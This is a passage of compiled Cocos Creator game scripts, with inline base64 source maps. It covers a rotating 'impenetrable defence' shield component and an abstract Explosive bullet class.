            }
        },
        enumerable: false,
        configurable: true
    });
    ImpenetrableDefence.prototype.defence = function () {
        if (this.ske.animation == "loops") {
            // this.rotateAction.setSpeed(0);
            this.ske.setAnimation(0, "transition", false);
            // this._defenceCD = 0.5;
        }
    };
    ImpenetrableDefence.prototype.update = function (dt) {
        if (GameProxy_1.GameProxy.pauseGame)
            return;
        if (this.node.color.getR() < 255) {
            this.node.color.setR(this.node.color.getR() + 1);
        }
        if (this.node.color.getG() < 255) {
            this.node.color.setG(this.node.color.getG() + 1);
        }
        if (this.node.color.getB() < 255) {
            this.node.color.setB(this.node.color.getB() + 1);
        }
        if (this.ske.animation === "loops") {
            if (this._defenceCD > 0) {
                this._defenceCD -= dt;
            }
            else if (this.rotateAction.getSpeed() < 1) {
                var speed = this.rotateAction.getSpeed() + 0.01;
                if (speed > 1) {
                    speed = 1;
                }
                this.rotateAction.setSpeed(speed);
            }
        }
        this._impenetrableDefenceCD -= dt;
        if (this._impenetrableDefenceCD <= 0) {
            this.node.active = false;
        }
    };
    __decorate([
        property(sp.Skeleton)
    ], ImpenetrableDefence.prototype, "ske", void 0);
    __decorate([
        property(cc.Node)
    ], ImpenetrableDefence.prototype, "followNode", void 0);
    ImpenetrableDefence = __decorate([
        ccclass
    ], ImpenetrableDefence);
    return ImpenetrableDefence;
}(cc.Component));
exports.default = ImpenetrableDefence;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL3JvbGUvSW1wZW5ldHJhYmxlRGVmZW5jZS50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7O0FBQ0Esa0RBQStDO0FBRXpDLElBQUEsS0FBc0IsRUFBRSxDQUFDLFVBQVUsRUFBbEMsT0FBTyxhQUFBLEVBQUUsUUFBUSxjQUFpQixDQUFDO0FBRzFDO0lBQWlELHVDQUFZO0lBQTdEO1FBQUEscUVBa0ZDO1FBL0VHLFNBQUcsR0FBZSxJQUFJLENBQUM7UUFHdkIsZ0JBQVUsR0FBVyxJQUFJLENBQUM7UUFFbEIsa0JBQVksR0FBRyxJQUFJLENBQUM7UUF3QmhDLGFBQWE7UUFDRCw0QkFBc0IsR0FBRyxDQUFDLENBQUM7UUFFM0IsZ0JBQVUsR0FBRyxDQUFDLENBQUM7O0lBK0MzQixDQUFDO0lBdkVhLG9DQUFNLEdBQWhCO1FBQUEsaUJBZUM7UUFkRyxJQUFJLENBQUMsVUFBVSxDQUFDLEVBQUUsQ0FBQyxFQUFFLENBQUMsSUFBSSxDQUFDLFNBQVMsQ0FBQyxnQkFBZ0IsRUFBRTtZQUNuRCxLQUFJLENBQUMsSUFBSSxDQUFDLFFBQVEsR0FBRyxLQUFJLENBQUMsVUFBVSxDQUFDLFFBQVEsQ0FBQztRQUNsRCxDQUFDLENBQUMsQ0FBQztRQUNILElBQUksQ0FBQyxHQUFHLENBQUMsbUJBQW1CLENBQUMsVUFBQyxVQUFVLEVBQUUsSUFBSTtZQUMxQyxJQUFJLElBQUksR0FBRyxVQUFVLENBQUMsU0FBUyxDQUFDLENBQUMsQ0FBQyxVQUFVLENBQUMsU0FBUyxDQUFDLElBQUksQ0FBQyxDQUFDLENBQUMsRUFBRSxDQUFDO1lBQ2pFLElBQUksSUFBSSxJQUFJLE9BQU8sRUFBQztnQkFDaEIsS0FBSSxDQUFDLEdBQUcsQ0FBQyxZQUFZLENBQUMsQ0FBQyxFQUFFLE9BQU8sRUFBRSxJQUFJLENBQUMsQ0FBQztnQkFDeEMsS0FBSSxDQUFDLFlBQVksR0FBRyxFQUFFLENBQUMsS0FBSyxDQUFDLEVB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QkFDVixLQUFLLEdBQUcsQ0FBQyxDQUFDO2lCQUNiO2dCQUNELElBQUksQ0FBQyxZQUFZLENBQUMsUUFBUSxDQUFDLEtBQUssQ0FBQyxDQUFDO2FBQ3JDO1NBQ0o7UUFDRCxJQUFJLENBQUMsc0JBQXNCLElBQUksRUFBRSxDQUFDO1FBQ2xDLElBQUksSUFBSSxDQUFDLHNCQUFzQixJQUFJLENBQUMsRUFBQztZQUNqQyxJQUFJLENBQUMsSUFBSSxDQUFDLE1BQU0sR0FBRyxLQUFLLENBQUM7U0FDNUI7SUFDTCxDQUFDO0lBOUVEO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxRQUFRLENBQUM7b0RBQ0M7SUFHdkI7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLElBQUksQ0FBQzsyREFDUTtJQU5ULG1CQUFtQjtRQUR2QyxPQUFPO09BQ2EsbUJBQW1CLENBa0Z2QztJQUFELDBCQUFDO0NBbEZELEFBa0ZDLENBbEZnRCxFQUFFLENBQUMsU0FBUyxHQWtGNUQ7a0JBbEZvQixtQkFBbUIiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJcclxuaW1wb3J0IHtHYW1lUHJveHl9IGZyb20gXCIuLi8uLi9nYW1lL0dhbWVQcm94eVwiO1xyXG5cclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5AY2NjbGFzc1xyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBJbXBlbmV0cmFibGVEZWZlbmNlIGV4dGVuZHMgY2MuQ29tcG9uZW50IHtcclxuXHJcbiAgICBAcHJvcGVydHkoc3AuU2tlbGV0b24pXHJcbiAgICBza2U6c3AuU2tlbGV0b24gPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5Ob2RlKVxyXG4gICAgZm9sbG93Tm9kZTpjYy5Ob2RlID0gbnVsbDtcclxuXHJcbiAgICBwcml2YXRlIHJvdGF0ZUFjdGlvbiA9IG51bGw7XHJcblxyXG5cclxuICAgIHByb3RlY3RlZCBvbkxvYWQoKTogdm9pZCB7XHJcbiAgICAgICAgdGhpcy5mb2xsb3dOb2RlLm9uKGNjLk5vZGUuRXZlbnRUeXBlLlBPU0lUSU9OX0NIQU5HRUQsICgpPT57XHJcbiAgICAgICAgICAgIHRoaXMubm9kZS5wb3NpdGlvbiA9IHRoaXMuZm9sbG93Tm9kZS5wb3NpdGlvbjtcclxuICAgICAgICB9KTtcclxuICAgICAgICB0aGlzLnNrZS5zZXRDb21wbGV0ZUxpc3RlbmVyKCh0cmFja0VudHJ5LCBsb29wKT0+e1xyXG4gICAgICAgICAgICBsZXQgbmFtZSA9IHRyYWNrRW50cnkuYW5pbWF0aW9uID8gdHJhY2tFbnRyeS5hbmltYXRpb24ubmFtZSA6ICcnO1xyXG4gICAgICAgICAgICBpZiAobmFtZSA9PSBcInN0YXJ0XCIpe1xyXG4gICAgICAgICAgICAgICAgdGhpcy5za2Uuc2V0QW5pbWF0aW9uKDAsIFwibG9vcHNcIiwgdHJ1ZSk7XHJcbiAgICAgICAgICAgICAgICB0aGlzLnJvdGF0ZUFjdGlvbiA9IGNjLnNwZWVkKGNjLnJlcGVhdEZvcmV2ZXIoY2Mucm90YXRlQnkoMC40NSwgMzYwKSksIDApO1xyXG4gICAgICAgICAgICAgICAgdGhpcy5yb3RhdGVBY3Rpb24uc2V0VGFnKDE0MCk7XHJcbiAgICAgICAgICAgICAgICB0aGlzLm5vZGUucnVuQWN0aW9uKHRoaXMucm90YXRlQWN0aW9uKTtcclxuICAgICAgICAgICAgfWVsc2UgaWYgKG5hbWUgPT0gXCJ0cmFuc2l0aW9uXCIpe1xyXG4gICAgICAgICAgICAgICAgdGhpcy5za2Uuc2V0QW5pbWF0aW9uKDAsIFwibG9vcHNcIiwgdHJ1ZSk7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9KTtcclxuICAgIH1cclxuXHJcbiAgICBzdGFydCgpe1xyXG4gICAgICAgIHRoaXMubm9kZS5wb3NpdGlvbiA9IHRoaXMuZm9sbG93Tm9kZS5wb3NpdGlvbjtcclxuICAgIH1cclxuXHJcbi8v5a+G5LiN6YCP6aOO55qE6Ziy5b6hKOatpuacrylcclxuICAgIHByaXZhdGUgX2ltcGVuZXRyYWJsZURlZmVuY2VDRCA9IDA7XHJcblxyXG4gICAgcHJpdmF0ZSBfZGVmZW5jZUNEID0gMDtcclxuXHJcblxyXG4gICAgc2V0IGltcGVuZXRyYWJsZURlZmVuY2VDRCh2YWx1ZTogbnVtYmVyKSB7XHJcbiAgICAgICAgdGhpcy5faW1wZW5ldHJhYmxlRGVmZW5jZUNEID0gdmFsdWU7XHJcbiAgICAgICAgaWYgKCF0aGlzLm5vZGUuYWN0aXZlKXtcclxuICAgICAgICAgICAgdGhpcy5ub2RlLmFjdGl2ZSA9IHRydWU7XHJcbiAgICAgICAgICAgIHRoaXMubm9kZS5zdG9wQWxsQWN0aW9ucygpO1xyXG4gICAgICAgICAgICB0aGlzLnNrZS5zZXRBbmltYXRpb24oMCwgXCJzdGFydFwiLCBmYWxzZSk7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIGRlZmVuY2UoKXtcclxuICAgICAgICBpZiAodGhpcy5za2UuYW5pbWF0aW9uID09IFwibG9vcHNcIil7XHJcbiAgICAgICAgICAgIC8vIHRoaXMucm90YXRlQWN0aW9uLnNldFNwZWVkKDApO1xyXG4gICAgICAgICAgICB0aGlzLnNrZS5zZXRBbmltYXRpb24oMCwgXCJ0cmFuc2l0aW9uXCIsIGZhbHNlKTtcclxuICAgICAgICAgICAgLy8gdGhpcy5fZGVmZW5jZUNEID0gMC41O1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICB1cGRhdGUoZHQ6bnVtYmVyKXtcclxuICAgICAgICBpZiAoR2FtZVByb3h5LnBhdXNlR2FtZSlyZXR1cm47XHJcbiAgICAgICAgaWYgKHRoaXMubm9kZS5jb2xvci5nZXRSKCkgPCAyNTUpe1xyXG4gICAgICAgICAgICB0aGlzLm5vZGUuY29sb3Iuc2V0Uih0aGlzLm5vZGUuY29sb3IuZ2V0UigpICsgMSk7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIGlmICh0aGlzLm5vZGUuY29sb3IuZ2V0RygpIDwgMjU1KXtcclxuICAgICAgICAgICAgdGhpcy5ub2RlLmNvbG9yLnNldEcodGhpcy5ub2RlLmNvbG9yLmdldEcoKSArIDEpO1xyXG4gICAgICAgIH1cclxuICAgICAgICBpZiAodGhpcy5ub2RlLmNvbG9yLmdldEIoKSA8IDI1NSl7XHJcbiAgICAgICAgICAgIHRoaXMubm9kZS5jb2xvci5zZXRCKHRoaXMubm9kZS5jb2xvci5nZXRCKCkgKyAxKTtcclxuICAgICAgICB9XHJcbiAgICAgICAgaWYgKHRoaXMuc2tlLmFuaW1hdGlvbiA9PT0gXCJsb29wc1wiKXtcclxuICAgICAgICAgICAgaWYgKHRoaXMuX2RlZmVuY2VDRCA+IDApe1xyXG4gICAgICAgICAgICAgICAgdGhpcy5fZGVmZW5jZUNEIC09IGR0O1xyXG4gICAgICAgICAgICB9ZWxzZSBpZiAodGhpcy5yb3RhdGVBY3Rpb24uZ2V0U3BlZWQoKSA8IDEpe1xyXG4gICAgICAgICAgICAgICAgbGV0IHNwZWVkID0gdGhpcy5yb3RhdGVBY3Rpb24uZ2V0U3BlZWQoKSArIDAuMDE7XHJcbiAgICAgICAgICAgICAgICBpZiAoc3BlZWQgPiAxKXtcclxuICAgICAgICAgICAgICAgICAgICBzcGVlZCA9IDE7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB0aGlzLnJvdGF0ZUFjdGlvbi5zZXRTcGVlZChzcGVlZCk7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9XHJcbiAgICAgICAgdGhpcy5faW1wZW5ldHJhYmxlRGVmZW5jZUNEIC09IGR0O1xyXG4gICAgICAgIGlmICh0aGlzLl9pbXBlbmV0cmFibGVEZWZlbmNlQ0QgPD0gMCl7XHJcbiAgICAgICAgICAgIHRoaXMubm9kZS5hY3RpdmUgPSBmYWxzZTtcclxuICAgICAgICB9XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/explosive/Explosive.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '289e79F1UZP3ZKZdsJwQRLh', 'Explosive');
// script/app/entities/explosive/Explosive.ts

Object.defineProperty(exports, "__esModule", { value: true });
var Bullet_1 = require("../bullet/Bullet");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var Explosive = /** @class */ (function (_super) {
    __extends(Explosive, _super);
    function Explosive() {
        return _super !== null && _super.apply(this, arguments) || this;
    }
    Explosive = __decorate([
        ccclass
    ], Explosive);
    return Explosive;
}(Bullet_1.default));
exports.default = Explosive;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2V4cGxvc2l2ZS9FeHBsb3NpdmUudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7OztBQUNBLDJDQUFzQztBQUVoQyxJQUFBLEtBQXNCLEVBQUUsQ0FBQyxVQUFVLEVBQWxDLE9BQU8sYUFBQSxFQUFFLFFBQVEsY0FBaUIsQ0FBQztBQUcxQztJQUFnRCw2QkFBTTtJQUF0RDs7SUFHQSxDQUFDO0lBSDZCLFNBQVM7UUFEdEMsT0FBTztPQUNzQixTQUFTLENBR3RDO0lBQUQsZ0JBQUM7Q0FIRCxBQUdDLENBSCtDLGdCQUFNLEdBR3JEO2tCQUg2QixTQUFTIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiXHJcbmltcG9ydCBCdWxsZXQgZnJvbSBcIi4uL2J1bGxldC9CdWxsZXRcIjtcclxuXHJcbmNvbnN0IHtjY2NsYXNzLCBwcm9wZXJ0eX0gPSBjYy5fZGVjb3JhdG9yO1xyXG5cclxuQGNjY2xhc3NcclxuZXhwb3J0IGRlZmF1bHQgYWJzdHJhY3QgY2xhc3MgRXhwbG9zaXZlIGV4dGVuZHMgQnVsbGV0IHtcclxuXHJcbiAgICBhYnN0cmFjdCBib29tKCk7XHJcbn0iXX0=
//------QC-SOURCE-SPLIT------
